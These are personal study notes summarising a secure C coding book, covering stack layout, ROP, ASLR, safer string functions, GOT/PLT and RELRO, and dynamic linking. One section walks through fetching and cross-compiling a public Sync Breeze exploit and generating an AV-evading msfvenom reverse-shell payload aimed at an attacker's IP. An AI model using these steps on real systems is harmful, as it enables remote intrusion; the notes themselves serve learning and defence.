# Secure C book
_2021-2022, Eliot Roxbergh_


_TODO: summary ends at 450 out of ~550 pages of [the book](https://www.amazon.com/Secure-Coding-2nd-Software-Engineering/dp/0321822137)._

This document contains a very rough, dirty, summary of _[Secure Coding in C and C++](https://www.amazon.com/Secure-Coding-2nd-Software-Engineering/dp/0321822137)_ [code_book], as well as other related material summarized (see last chapter "Off-Topic").
Idea was to use this document as a quick reference with ctrl+f. I write this from a C standpoint, mainly skipping C++ details.

Sources are cited/mentioned, but only if not from the book, this is then implied.

In addition to internet resources, these books are cited:
- _C in a Nutshell 2e, 978-1491904756, Peter Prinz & Tony Crawford, 2016_
- _The Linux Programming Interface, 978-1593272203, Michael Kerrisk, 2010_

## My Related Work

Example C project, with testing (unit tests, code coverage, static analysis, memcheck): https://github.com/Eliot-Roxbergh/task_portknocker

Discussion on static analysis in C: https://github.com/Eliot-Roxbergh/static_analysis

Compiler / Linker Flags: https://github.com/Eliot-Roxbergh/examples/blob/master/c_programming/development_tips/gcc_flags.md


## Summary chap. 1-3

I found these topics to be the most interesting for chapters 1-3 (TODO expand more on these topics and summarize); \
**Stack** +attacks +ROP (+syscalls) \
**ELF format** +loaded in memory +static vs. shared library (PIE/PIC) \
**Dynamic linking** (linktime and runtime, where to look)

( TODO; In the book there are tables comparing safe and unsafe string functions (e.g. chapter 2.5, pp. 92-93) and I don't reproduce it here, although I try to summarize it later. Regarding if specific C functions are safe or unsafe - could mention TL;DR i.e. in C the main isssue is that we don't know the length of a regular string (i.e. char*) therefore to modify we need to give dest and src length as arguments? Is this it? And even if some faults can be detected with compiler (depends on compiler specific features!), but this is not reliable see section [Object size checking GCC](#object-size-checking-gcc) (chapter 2.6) )




## Intro and Strings (Chap. 1 - 2.2)

pg 22-23, mentions different kinds of non-standardized behavior types (locale-specific, unspecified (multiple implementations are allowed), implementation-defined, undefined). Compiler might use specific undefined behavior (i.e. not specified by standard) to make speed-ups, optimiztaions, etc. The compiler also assumes no undefied behavior is present (how could it?) which might get funky when optimized.

Size = total _size_ (incl. NULL) , Length = number of elements _excluding_ NULL.
They recommend, use UNSIGED or SIGNED CHAR for integer values / data format, but plain CHAR for character (readable data)
 (... note that the standard does not specify whether plain char is signed or unsigned.)

use UTF-8. UTF-16/wide char seems deprecated / pain in the ass. [utf8]

pg 39, question - only integer type unsigned char is "guaranteed to be represented using pure binary notation". Really? I don't get it.

Absurd (is it?) that C interprets an array as argument to a pointer (char a[] -> char* a), this is dangerous if e.g. we assume sizeof would yield total size of array (and not of the char* type).

String truncation can also be bad even if we manage to avoid overflows. Might be good to check that it all fit.


## String Vulnerabilities (Chap. 2.3)

### Brief Summary of Some x86 Instructions


    ESP - Top of stack (where free stack memory starts)
    EBP - Current stack frame (where it starts)
    EIP - Instruction Pointer

### Stack Frame (for a function)

    [free stack memory / or next frame]
    ------------------------------------------
    Vars (local scope)
    ------------------------------------------
    Calling frame of caller
    ------------------------------------------
    Return address to caller ( what if this could be overwritten... ;) )
    ------------------------------------------
    Args (input)
    ------------------------------------------
    [prev. frame in stack]


### Stack (~p. 56)


The stack; Obviously this is just memory, stored in the same virtual memory space as the heap et al.
The name originating from the pop/push operations done when switching between functions (function calls and return therefrom).
But this is just memory and usually just use like such? (question)

Within the scope of a certain function, it is likely that the registers cannot hold all local data - especially as different instructions req. certain registers to be empty/filled/or whatever -
and in this case the stack is used? Additional to poping or pushing the stack frame (containing multiple variables/pieces of data) when changing scope.

Addendum: In one way of thinking, stack and heap are the same (although stack also contains arguments and return address for instance)
		- it is memory which we can read and write without any problem.
		Since stack is continually freed as we leave functions, we can employ a simple just push new values on top as we know that the stack should not be full anyway.. we have automatic garbage collection (you get the point).
		Heap on the other hand has a very long lifetime, so we want to free these variables. However, unlike the stack we don't automatically know when these are going to be freed, and especially in what order.
		Because the latter, we need to use a more advanced data structure which allows us to free certain values regardless of the order on the heap (i.e. not a stack-design) .. which in-turn can cause more problems such as fragmentation and overhead.
	Question: How does leaving a smaller scope (in C any { } block) affect the stack in memory? Remember when exiting any scope some variables might be "lost" in C.


### Assembly and syscalls (~pp. 65-66)

int 80 / syscall / sysenter instruction to perform syscall (based on value in register) [syscall_instr]
syscalls triggers interupts to kernel (ring 3 -> ring 0), this is slow and requires (re)setting registers etc.
Mitigation, use vDSO to perform some syscalls i userspace [vDSO_intro]

Kernel space is actually separate memory (Linux example top 1/4 of memory, the rest is userspace), additionally not all instructions are allowed from user space. [kernelspace]
Always remember; The kernel rules and you rely on the kernel to do.. well a lot of things (usually all system calls remember!)... e.g. I/O.

vDSO can run some syscalls in userspace [vDSO_intro]


### Injections (pp. 64-72)

If we can somehow write to the stack, e.g. with a buffer overflow, we can exploit (e.g. change return address, change variables (such as function pointers)).

So, assumption being we control the stack ... but only the stack (including of return address).

Code injection = just overwrite return address and write a payload on the stack to execute. -> but memory is marked read-only (NX-bit)!

Arc injection = by just overwriting return address we change control-flow ("a new arc"), jump to exec()/system() ("jump to libc") or anywhere fun in general. -> we don't have libc, and now with ASLR we don't know any addresses! (quick summary, but approximately this)

Return-oriented programming = write payloads on stack using gadgets in other code |$gadgetA|arg1|$gadgetB|arg1|arg2|$gadgetC, example gadget could be the instructions "pop %ebx, ret" which would load attacker control argument into ebx to be used by another gadget later.
                                In this example gadgetA would be the return address which is then loaded to eip and executed. Poping changes the stack, and the later ret updates the instruction ptr (eip) to the address of the second gadget .... and the chaining continues.
                                By doing this we can use the target binary itself (which supplies the gadgets) to generate (usually?) arbitrary programs to execute. -> We might be able to exploit even if ASLR, non-executable memory area, canaries etc.
                                I'm not sure right now how all this is bypassed, some is not bypassed by simple ROP but the last years so called blind ROP has shown to bypass these defenses. Also ASLR usually only randomizes the start of the stack/heap/..
                                but if the binary is known and we can figure out the instruction of one instruction - we will know the position of our gadgets in relation to that instruction.
                                -> what if the binary is unknown (see blind ROP), more defenses like control-flow protection...? [ROP]


Comment regarding ROP and the stack. We have two important instructions, ret (return from function) and call (call function), these modifies both the stack (ebp) and the instruction ptr (eip). ROP is dependent on the ret call (each gadget need to end in a ret instruction)
	ret   = pop eax
		mov eax eip
	     ~= eip = *ebp
		ebp++
	call ~= push return_adr
		eip = function_to_call

Comment: (intuition / simplification) Tail recursion can be done by simply updating the local values on the stack (for our calculations) and jumping back to the start of the function (instead of performing 'call' instruction). Tail recursion optimizations are actually often done in C/C++ with modern compilers (with different optimization flags, such as -O3), thereby avoiding the overhead that can comes with deep recursion (as well as, finally stack overflow due to the amount of stack frames).
(more here: https://stackoverflow.com/questions/34125/which-if-any-c-compilers-do-tail-recursion-optimization, https://stackoverflow.com/questions/2693683/tail-recursion-in-c, and GCC thesis: www.complang.tuwien.ac.at/schani/diplarb.ps )

### More on ASLR

(TODO I wrote some comments in the book itself, see [ASLR-windows].)

Randomize memory segments.
Random but: have caching/page in mind, layout (heap and stack grows towards each other).

In the meanwhile, some inspiration:

https://medium.com/csg-govtech/defeating-kaslr-in-modern-operating-systems-f0d441c21b6c

https://sysprogs.com/VisualKernel/tutorials/kaslr/

https://en.wikipedia.org/wiki/Address_space_layout_randomization

https://blog.blazeinfosec.com/the-never-ending-problems-of-local-aslr-holes-in-linux/

https://gist.github.com/thestinger/b43b460cfccfade51b5a2220a0550c35

### Example exploit (not from the book)

Modifying and building exploits. The example: use an exploit to overwrite stack, this enables us to trampoline (using return address) to a loaded library (without ASLR) which then jumps to our shellcode on stack.


#### Build: C code - searchsploit

- Download and inspect the exploit

```
searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m 42341
vim /tmp/42341.c
```

- Make sure it builds, and if made for Windows, cross-compile
```
##dep: sudo apt install mingw-w64
##if error, search and try to fix
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

- Edit to include own IP and port, for instance

- Run exploit, if Windows binary it should be possible to run with Wine.
```
wine syncbreeze_exploit.exe
```

#### Modify exploit to fit

##### Finding DLL to use (trampoline)
Looking at the exploit (vim /tmp/42341.c), we notice that the return address goes to `msvbvm60.dll`.
Running exploit in our test environment (hopefully a copy of the target) with Immunity debugger, however, we notice that it is not loaded.

```
Immunity debugger (as administrator)

-> File -> Attach
	syncbrs (process)

-> View -> Executable modules -> [msvbvm60.dll is not here]
```

We need to find an available return address. Either from finding an eligible address by running service on local machine, or use same address as other exploits targeting that OS version.

The address needs to point to non-ASLR address, look if there are such modules loaded.

If we are unpriviledged on target, we can copy those libraries (DLLs) onto our local machine and create a fitting payload. For instance, `objdump`.


##### Modify payload

1. Change details such as IP and port to ours
2. Change return address if necessary (see above) (usually address must not contain bad characters)
3. Change payload if necessary, e.g. get a C reverse shell for windows with: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"` \
msfvenom: `-f c` = C code, `-e ..` = encoder (encode to avoid AV), `-b ..` =  bad chars which are not to be used (e.g. \0). \
NOTE: Change to your IP


##### Explanation of exploit: overwrite RET (want to call JMP ESP)

**Comment:** it is not uncommon that an ASLR binary uses non-ASLR library (or the opposite). Sometimes ASLR is disabled for performance hacks or whatever reason (Just-in-time compilation etc.?).

**Scenario:** ASLR binary calls non-ASLR library -> find a gadget we want to use here basically

It works something like this,

note: $ESP is just a register holding address pointing to start of the stack, the register itself is not modified but we control the memory it points to.

1. Our overflow has overwritten the stack, this includes the RET address (which we will jump to shortly, as the function ends).
2. But we can't jump directly because we don't know the stack address (randomized /w ASLR), even though it is stored in $ESP. (someone also said that it's not possible/hard to jump to stack even if we know address, since it starts with 0x0, idk, perhaps, and thus would not work as input string to the application).
4. Solution, we want to run "JMP $ESP" to jump to stack (our shellcode); So, find this instruction in a code area that is not ASLR (e.g. in a library) and jump to it (like a trampoline). FIRSTLY, find address of such instructions using (Immunity debugger -> search for -> All commands in all modules -> and choose the instr and copy its address)
SECONDLY, choose one; this is the address we want to overwrite RET with.
5. Now when RET is popped, we get to the "trampoline" which just calls JMP $ESP and we're running our shellcode. That is, by jumping to $ESP ( = stack pointer = top of stack) we end up in our controlled memory (stack).

**Notes:**

NOP is used just to be sure - if some variables are changed or poped from stack.

Our payload (shellcode and return address) are entered to the target application. Therefore, it may have some limitations. If written in C, '\0' will not work. Etc.

Q: so stack memory is executable, is this normal? Other defenses that could prevent this specific method?


## Mitigation strategies (Chap. 2.4) (pp. 73 -> 83)

### C11 Annex K

Caller allocates, caller frees. (But for the functions mentioned here we dont need to have dynamic memory... But if we do we need to free... Is that what we're saying here?)


Optional in C11 is Annex K which specifies "bounds-checking interfaces" (strcpy_c,strcat_s,strncpy_s,strncat_s, and get_s ?). For instance, "strcpy_s (d, sizeof d, a)" src size is not known but dest is (if both known we use strncpy_s). So a small change for legacy code safety [c11_annex-k].
The book also mentions this is reentrant (?).

Later on chap. 6 (pp. 340-341), summarized later, it is mentioned that the _s version of _formatted output_ functions also have
checks on the input such as if it is NULL etc.


### Dynamic allocations functions

(ISO/IEC TR 2473102)

Callee allocates, caller frees.

getline from stdio.h (this functions allocates memory and does everything, "defined behavior for any input")

streams (see also pg 209 in "C in a Nutshell").

Dynamic allocation (atleast after startup/first initialization) is often disallowed in safety-critical systems (e.g. MISRA standard) .. (and one possible strategy is to allow mallocs during initialization but never during regular runtime, and never free. So minor memory "leaks" will be freed on application exit [citation needed])
Are they disallowed because any memory leaks could be catastrophic? And not deterministic? Slower than static alloc? Fragmentation (non-deterministic! Slow! What's the worst case? How much memory do we need worst case?) and harder to optimize? I guess generally harder to find bugs ... problems may arise only during runtime... [dynamic_allocation]
With dynamic allocation fragmentation will probably occur, and then there is a risk that heap allocation will fail. And otherwise the memory manager may reorder the heap, but this will take time and could add delay when the program needs malloc/free. Unknowns, delays, undeterministic... I remember some company had issues with Golang since it has runtime garbage collection and this adds delay.
Also semi-related ... the system may have it's own implementation of malloc/free for optimization or debugging. All kinds of fun things can occur?

### C++

C++ has it's own strings thing that does a lot of this automatically (but can still be broken).

Callee allocates, callee frees. (How does this work exactly?), they say this is the most secure variant of the three.


## String Functions (Chap. 2.5) (pp. 84-100)

**Comment**, also discussed in [c-in-kernel] (use strscpy and not strcpy/strncpy/strlcpy. scnprinf (kernel specific, returns bytes copied), snprintf (just remember: returns bytes that _would_ be copied), and do not use sprintf.

Use "secure" functions strcpy_c, strcat_s, strncpy_s, et al! The problem with strncpy is that even if it would protect from buffer overflow, it may still truncate the result (may lose data and not null terminated) and if the src is not null-terminated neither will the dest.
That is, the programmer need to manually check that the output is null-terminated and not truncated ... additionally str(n)cpy only returns the pointer to the result, not any info whether it has been truncated or not.
strcpy_s does NOT truncate and if it would not fit it would return NULL pointer, additional to this it also returns an error code.

Basically, use strcpy_s/strncpy_s or strcat_s/strncat_s. These does not use dynamic memory. If you need dynamic memory can use strdup (free me).
(_If_ we wish we can also allow truncation in strncpy by lowering the n parameter. strncpy always null terminates)

btw, restrict keyword in C is only for the compiler, only for performance reasons: "When the restrict keyword is used with a pointer p, then it tells the compiler, that ptr is only way to access the object pointed by this. So compiler will not add any additional checks." [restrict_keyword] (See also [restrict_keyword-2])

strdup / strndup is OK... but uses dynamic memory (remember to free). No dynamic checks (make sure input is good; not null, but null terminated, ...). Table on p. 99

Some of these functions, such as strdup, sets errno on error, which we can check (remember to set errno=0 before hand if it could be set by another function prior).

Be careful with memcpy and memmove (doesn't specify size of destination) use memcpy_s and memmove_s (C11).
Similar to strncpy vs strncpy_s. New functions return error code, and zero the destination memory on "runtime-constraint violation".

## Runtime Protection (Chap. 2.6)

Security in depth. As we have seen a buffer overflow can be the start of the attack, then leveraged with ROP or other exploit technique, and several defenses can be utilized in different places (e.g. 1. avoid overflows, 2. detect and lessen the damage of overflows).
Step one is to avoid buffer overflows, can we stop the attack at the first step?

### Object Size Checking (GCC)

(also see section below "GCC Flags")

\_\_builtin\_object\_size()

compiler (here GCC) tries to find buffer overflows (_FORTIFY_SOURCE=1) during; \
	-> **compile time** (sizes known beforehand, or otherwise obvious overflow) (PREFERRED) \
	-> **runtime** (the size of destination is known at compile time but not of the source, check at runtime that source can fit with __memcpy_chk or __strcpy_chk) (runtime-constraint violation) \
	-> **nothing** \
Runtime checks are better than nothing but comes at performance penalty and well you will get an error during execution you need to handle...

Also described here -> [object-size-checking]

Comment: The fact that the size of both src and dest can be unknown during (compile time and) runtime is worrisome. For instance, you get two pointers from another external functions, how would you be able to know their size ... 
		Heap allocated data in C (usually?) includes information on the size (for free()) (but it can't be used by us in general?? Not standardized?), arrays have known size but decays to pointer when passed to a function, stack pointers have no size metadata?
		Hmmm...
Question: What would need to be done to be able to find all overflows either during compile time or runtime (language / compiler-wise)?

## Pointers (Chap. 3)

ELF format (similar for PE executables on Windows);
"
	.text 	where code live, as said above. 'objdump -drS .process.o' will show you that
	.data 	where global tables, variables, etc. live. 'objdump -s -j .data .process.o' will hexdump it.
	.bss 	don't look for bits of .bss in your file: there's none. That's where your uninitialized arrays and variable are, and the loader knows they should be filled with zeroes.
	.rodata 	that's where your strings go, usually the things you forgot when linking and that cause your kernel not to work. objdump -s -j .rodata .process.o will hexdump it. Note that depending on the compiler, you may have more sections like this.
	.comment & .note 	just comments put there by the compiler/linker toolchain
	.stab & .stabstr 	debugging symbols & similar information.
"[ELF-file]

BSS = uninitialized globals and static (stuff that doesn't need to be stored in binary on disk) (THIS IS ZERO INITIALIZED in C, according to the standard)
data = initialized globals and static "and constants" (basically all global stuff)

Depending on where a buffer overflow happens, different things can be explioted. The stack being an especially juicy target.
In certain cases it is of course possible to perform buffer overflows in data and BSS areas.
In this case we don't have any reliable method to jump or write to arbitrary memory (as I understand), but depending on the code additional fun things can be done by the attacker.
With the buffer overflow in the data area, the attacker can write to variables therein (at least if it is later in that memory segment, as we write past the target area)...
This is dangerous from obvious reasons ... but things can get really bad examples;
	*ptr = data;  // if attacker controls both, we have arbitrary memory write

	static void (*funcPtr)(int);
	(void)(*funcPtr)(123);  // if attacker overwrites funcPtr we can jump and execute any address (i.e. it sets the eip register, bla bla)

Comment: The BSS and data areas are known at compile/run (??) time and does not grow dynamically like stack and heap. Therefore, I assume we shouldn't be able to overflow and overwrite the code area ... also data area should always be read only.


### Other areas at risk (Chap. 3.5, 3.6)

Note: ELF format is the executable which also describes how it looks in memory "The program header table tells the system how to create a process image." [ELF-file-1] (, [ELF-file])
Different segments are loaded into process memory.
On Linux see program 'ld' (dynamic linker/loader).

#### GOT

Global Offset Table (GOT) (details are for ELF-binary format but PE binaries has similar GOT, however in the book they say that PE binary GOT is not exploitable ... from what I understand since their GOT equivalent area (or whatever) is write-protected)

Table stored in ELF binary and then loaded into memory, functions which we don't know at compile/link time are instead going via the GOT at _run time_.
This is necessary for PIE (Position-Independent Executable/Code) which is needed to use ASLR with dynamic linking [GOT_PIE] (we don't know beforehand where the code is).

For instance, if we are calling libc functions (dynamically linked) from our code, we point to a static address in our memory space (in GOT) which in turn points to the dynamic address.
Attack vector; With an arbitrary memory write an attacker could overwrite memory addresses in GOT, calls to these functions (one popular example could be exit() call in libc) could then be redirected to attacker controlled function (exactly what this would be is another question).

The details are not discussed in the book and perhaps not essential for this part, however, dynamic libraries and linking is discussed [dynamic-libraries].
(Usually we link with lazy binding (more in next subsection), that is the address is resolved during run time at the first call to that function -> dynamic linker loads the function into shared memory (as opposed to process memory) and updates reference in GOT)
(Another related term is Procedure Linkage Table (PLT)) [linking_and_PLT]

Unrelated?; "There is one GOT per compilation unit or object module, and it is located at a fixed offset from the code (although this offset is not known until the library is linked). When a linker links modules to create a shared library, it merges the GOTs and sets the final offsets in code. It is not necessary to adjust the offsets when loading the shared library later." [GOT_PIE]

(I might be wrong here, but quite certain that;) PIE is necessary for executing code which addresses are not known at link/compile time. But even without PIE the stack and heap may be randomized [ASLR_Linux_bypass].
( So with ASLR e.g.; stack starts at random address (randomness but stack/exec/heap/libs are still in a certain area, and grows in a certain direction), heap starts at random address, lib (ld.so?) starts at random adr (must have PIE..?), exec starts on random address (if PIE) )


##### Lazy Binding / RELRO, PLT, GOT

**tl;dr** By disabling lazy binding (i.e. to instead load all dynamically linked functions at beginning of execution),
we may make the GOT read-only and thus avoid potential exploits. This is called **RELRO**, and can be passed to the linker.

**Update:**
- .got includes variable addresses, .got.plt includes function addresses: <https://stackoverflow.com/questions/11676472/what-is-the-difference-between-got-and-got-plt-section>, <https://stevens.netmeister.org/631/elf.html>
- Partial RELRO (as opposed to Full RELRO) is default in GCC and ONLY protects .got, thus .got.plt is still writable and exploitable: <https://book.hacktricks.xyz/binary-exploitation/common-binary-protections-and-bypasses/relro#partial-relro>, <https://www.mdpi.com/2076-3417/12/13/6702>.
- With Full RELRO we can try to perform a buffer overflow attack to replace the return address to a viable gadget already in got.plt.
- With Partial RELRO _(here assumes no ASLR)_ we can perform different kinds of _simpler_ attacks to replace the .got.plt entry itself;
<https://medium.com/@0xwan/binary-exploitation-heap-overflow-to-overwrite-got-d3c7d97716f1>. _My understanding is that: the stack grows downwards with new allocations and as it does the start of the stack decreases, moreover the addressing starts there and goes _upwards_ meaning we cannot directly "go down in memory", i.e. read/write to the heap, or GOT, for instance (which would only be technically reachable with many new allocations that would error out due to overflow into, "overlap with", heap memory) (<https://security.stackexchange.com/questions/135786/if-the-stack-grows-downwards-how-can-a-buffer-overflow-overwrite-content-above/135798#135798>) - even if we could probably use this overflow in multiple steps, e.g. \w gadgets, to achieve the same in practice._
First of all we can on a non-ASLR system directly read or write to the got.plt addresses (and other addresses such as data) - this is necessary for normal program functioning: in this case it needs to be because GOT uses lazy-binding as described below?
_(TODO: offtopic, can the stack be reachable directly from program via $RSP (x86_64) address? i.e. could a general arbitrary write also change the return ret address)_
That is, no magic necessary - we can simply make a memory write - if we control the code: <https://ir0nstone.gitbook.io/notes/binexp/stack/got-overwrite/exploiting-a-got-overwrite>, it exists in its memory space (literally).
_Example with stack buffer overflow (TODO how and TODO why is overflow used here) <https://www.exploit-db.com/papers/13203>._ \
Why use complex overflow techniques to overwrite got.plt entries then? Answer: overflow or similar attacks might be used in-the-wild as an attacker will want try to change the process' execution path without modifying the binary (as the binary could have no write permissions, or communicated with remotely over the Internet, etc.),
which in this case could be done by somehow overwriting a single address in got.plt via arbitrary write.
One can imagine different ways where stack overflows or other methods could create arbitrary ("out-of-bounds") writes here
- Note that ASLR / PIE can make these attacks more difficult. GOT-related attacks are done to bypass certain protection mechanisms such as NX-bit.


_Source for this subsection: [lazy-binding]_.

Not for Linux... but to get the idea;

>    "Lazy binding (also known as lazy linking or on-demand symbol resolution) is the process by which symbol resolution isn't done until a symbol is actually used. Functions can be bound on-demand, but data references can't.
>    
>    All dynamically resolved functions are called via a Procedure Linkage Table (PLT) stub. A PLT stub uses relative addressing, using the Global Offset Table (GOT) to retrieve the offset. The PLT knows where the GOT is, and uses the offset to this table (determined at program linking time) to read the destination function's address and make a jump to it.
>    
>    To be able to do that, the GOT must be populated with the appropriate addresses. Lazy binding is implemented by providing some stub code that gets called the first time a function call to a lazy-resolved symbol is made. This stub is responsible for setting up the necessary information for a binding function that the runtime linker provides. The stub code then jumps to it.
>    
>    The binding function sets up the arguments for the resolving function, calls it, and then jumps to the address returned from resolving function. The next time that user code calls this function, the PLT stub jumps directly to the resolved address, since the resolved value is now in the GOT. (GOT is initially populated with the address of this special stub; the runtime linker does only a simple relocation for the load base.)
>    
>    The semantics of lazy-bound (on-demand) and now-bound (at load time) programs are the same\:
>    
>    In the bind-now case, the application fails to load if a symbol couldn't be resolved.
>    In the lazy-bound case, it doesn't fail right away (since it didn't check to see if it could resolve all the symbols) but will still fail on the first call to an unresolved symbol. This doesn't change even if the application later calls dlopen() to load an object that defines that symbol, because the application can't change the resolution scope. The only exceptions to this rule are objects loaded using dlopen() with the RTLD\_LAZY flag (see below)."


man 1 ld -> "Lazy binding is the default" (why?)

Override for one execution: "LD_BIND_NOW=1 ./foobar"

Or for the whole program:   "qcc -Wl,-znow -o foobar -lfoo.so -lbar.so" (think this is the same for GCC)


>    "
>    [..] calls point to the Procedure Linkage Table (PLT), which is present in the .plt section of the binary. The .plt section contains x86 instructions that point directly to the GOT, which lives in the .got.plt section. GOT normally contains pointers that point to the actual location of these functions in the shared libraries in memory.
>    
>    The GOT is populated dynamically as the program is running. The first time a shared function is called, the GOT contains a pointer back to the PLT, where the dynamic linker is called to find the actual location of the function in question. The location found is then written to the GOT. The second time a function is called, the GOT contains the known location of the function. This is called "lazy binding." This is because it is unlikely that the location of the shared function has changed and it saves some CPU cycles as well.
>    
>    There are a few implications of the above. Firstly, PLT needs to be located at a fixed offset from the .text section. Secondly, since GOT contains data used by different parts of the program directly, it needs to be allocated at a known static address in memory. Lastly, and more importantly, because the GOT is lazily bound it needs to be writable.
>    
>    Since GOT exists at a predefined place in memory, a program that contains a vulnerability allowing an attacker to write 4 bytes at a controlled place in memory (such as some integer overflows leading to out-of-bounds write), may be exploited to allow arbitrary code execution.
>    
>    [..] To prevent the above mentioned security weakness, we need to ensure that the linker resolves all dynamically linked functions at the beginning of the execution, and then makes the GOT read-only.  This technique is called RELRO and ensures that the GOT cannot be overwritten in vulnerable ELF binaries.
> 
>    [Enable by:] gcc -g -O0 -Wl,-z,relro,-z,now -o <binary_name> <source_code>" 
> 
>   - [GOT-RELRO-hardening]

###### Check if ELF is Vulnerable

(They ([GOT-RELRO-hardening]) use checksec program to check what protections are enabled -> https://www.trapkit.de/tools/checksec/)

See also scanelf (according to https://wiki.gentoo.org/wiki/Hardened/GNU_stack_quickstart)

##### Short on compiling and linking....

(preprocessor stuff?) -> compiler -> (static) linker -> loader (dynamic linker?)

Linker fills in any addresses it can and static libraries are put in the executable, dynamic libraries are instead taken care during runtime by loader.
(Runtime) loader with PLT and GOT enables use of dynamic libraries (jump to an address which is known only during runtime).


##### Dynamic linking continued

(Not used as source, but a comparison with static and dynamic linking here https://stackoverflow.com/questions/1993390/static-linking-vs-dynamic-linking basically what I mention here. Tl;dr from this link: Dynamic linking is often used for slightly lower resource consumption (disk space, memory (if other processes uses the same library version at "the same time"), clock cycles used) but also for license reasons (see my earlier post on this, e.g. LGPL https://github.com/Eliot-Roxbergh/Eliot-Roxbergh.github.io/blob/master/posts/GPL_compliance.md) and since it's handy that their dependencies can be updated (if backward compatible of course) without the knowledge of the application itself. Also useful if we want to add different plugins (hmm?) or if we want to override a depedency (LD_PRELOAD))

In this subsection are some comments from/on [dynamic-libraries].

(__It sounds like__) Dynamic linking not only makes smaller binaries, but it could also lessen the memory requirements as multiple processes could share the same shared memory, containing the shared library (read-only).
This is all during runtime and when the first process makes this function call (or when the process itself is started if not lazy binding) it is loaded into shared memory (only the library code block that is).

```
Comment: On page 836 it's mentioned that it is loaded when the program is started, but I thought it is more common when the function is actually called? Maybe they are correct since it's usually better with longer startup time than abrupt delay some time during runtime.
	 This can be set with LD_BIND_NOW (but is not default?)
	 	(not related? You can also preload, overwrite, specific libraries with LD_PRELOAD)
		(also LD_DEBUG for debugging / fun)
	 	man 1 ld -> "LD_BIND_NOW -
			     If set to a nonempty string, causes the dynamic linker to
              		     resolve all symbols at program startup instead of
              		     deferring function call resolution to the point when they
              		     are first referenced.  This is useful when using a
              		     debugger."
```

Dynamic linking has some overhead since we need to go through the PLT, also hard to optimize across compilation units (especially for dynamic linking since then the library is then not optimize able by linker? For static linking we can do LTO?). \
Statically linked binary; More optimizations can be made if we compile all static libraries together with the binary, and not link in precompiled libaries. \
Shortly mentioned here https://youtu.be/dOfucXtyEsU?t=3511

```
    "Link Time Optimization (LTO) gives GCC the capability of dumping its internal representation (GIMPLE) to disk, so that all the different compilation units that make up a single executable can be optimized as a single module. This expands the scope of inter-procedural optimizations to encompass the whole program (or, rather, everything that is visible at link time)." [LTO]
```
(So here I assume this can't be done for dynamically linked libraries since these are not in the actual executable) \
Thoughts: Also during runtime I assume no real optimizations can be made, only thing we have is dynamic linker. ... (part assumption from my part;) The situation is different for languages that runs on top of a virtual machine (e.g. Java) which can make runtime optimizations (see "dynamic compilation").

Generally **PIC** (-fPIC) is generally required for shared libraries (as compared to static libraries), and even if not, PIC is necessary if multiple processes are to use the same library .text (code) segment, saving memory.

**$LD_LIBRARY_PATH** is (one of the places) where the _dynamic linker_ looks during runtime for the libraries needed (as specified in the ELF exectuable). Static libraries are already linked in before runtime - "static linking".

**soname** -> Multiple versions of same library have same soname as long as compatible, thereafter it's incremented. For example, libx.so.1 could point to (symbolic link) libx.so.1.0.1 or to libx.so.1.9.3 which would have the same ABI exposed. \
Format is libx.so.[major-id].[minor-id] for the shared library. (pp. 845-846)  \
There is also "linker name" which is version independent (just get the newest version, e.g. libx.so -> libx.so.2.0.1 or (soname) libx.so.2)

**Tools:** ldd, objdump (and readelf), nm - are mentioned pp. 843-844 and examples are shown later in the chapter.

**ldconfig** keeps track of; Libraries present and path is cached (/etc/ld.so.cache) print with ldconfig -p. Versions and updates symlinks to libs (i.e. for soname and linker name). So ldconfig needs to be run if a library is updated or added. \
ldconfig -n can be used for "private libaries" - it doesn't update cache (which is global in /etc/) and only processes the library paths given as argument (e.g. ".").

When building we can also set rpath (runtime path, related are DT_RPATH and DT_RUNPATH (they are slightly different things)) where the dynamic linker will look, in addition to (1) the standard library directories (/lib, /usr/lib, and lasted in /etc/ld.so.conf) and (2) directories in LD_LIBRARY_PATH. \
(An alternative is to instead set the LD_RUN_PATH during building for similar result ... and leave rpath empty)

**$ORIGIN** can be used to load (shared) libraries relative to where the executable is located, e.g. to deliver an application with shared libraries bundled in one archive.

**Finding shared libraries at runtime** ->
	if contains slash it's a path and that is used
	else
		check (DT_RPATH) rpath (set during linking)
		check LD_LIBRARY_PATH (set whenever, before running the program, can be set by the user!
					-> since set by user s-bit programs ignores LD_LIBRARY_PATH - we don't want to run user-defined libraries as root (i.e. if the user has a library with the same name in its path) )
		(check DT_RUNPATH (set during linking) )
		check standard library locations /etc/ld.so.cache and /lib and /usr/lib (set whenever, by root)

It can get confusing if there are multiple definitions of the same function (i.e. symbol). Local definitions will trump any function definition from shared library, and if multiple definitions in multiple libraries it will take the first one mentioned (left-to-right). \
-Bsymbolic can be used when building (linking) a library, references to functions FROM this library should if possible be to definitions IN this same library (_"references to global symbols within a shared library should preferentially bound to definitions (if they exist) within that library"_) \
The C keyword _static_ has similar effect as -Bsymbolic, in addition _static_ also makes the symbol private for that source file. A similar keyword is __GCC__ _hidden_, which instead of per source file makes the symbol private (and "-Bsymbolic") for/within the whole library.

( Static libaries can still be preferable in some cases, (I assume also less error prone, less complexity and therefore also good in sensitive applications). And if we want static linking make sure it's not in really taking .so (shared) when we want .a (static) library... described 41.13 pg. 856 )

(see section GCC Flags: https://github.com/Eliot-Roxbergh/examples/blob/master/c_programming/development_tips/gcc_flags.md)

##### Dynamic linking advanced ([dynamic-libraries, Chap. 42])

"load libraries at at later time [..] API to the dynamic linker" -> "dlopen API"
We can thereby ~"open shared library at runtime, search for func, and then call that func."

###### (Reducing exposed symbols)

Less symbols is good: smaller, faster, less symbol collision... and in general why expose more than you need [GCC-visibility]. \
Linker version scripts - can control symbol visibility and versioning... -> e.g. specify exactly which symbols to expose ("whitelist" or "blacklist"... uh you get the point) \
Another alternative is to set -fvisibility=hidden (set default symbol visibility -> hidden). This can then be overridden for each function \_\_attribute\_\_((visibility("default"))) \
Some links on this: https://stackoverflow.com/questions/435352/limiting-visibility-of-symbols-when-linking-shared-libraries, [GCC-visibility], https://gcc.gnu.org/onlinedocs/gcc/Code-Gen-Options.html

###### "Monitoring the dynamic linker"

LD_DEBUG=help prog #see options
LD_DEBUG=libs prog #trace library searches for prog



#### Exploiting other similar vectors

##### (GCC specific .ctors section)

.ctors, .dtors - used by GCC for constructor and destructor (you can set with __attribute__ ((destructor)) ).
If this address is overwritten we can get attacker function to execute.
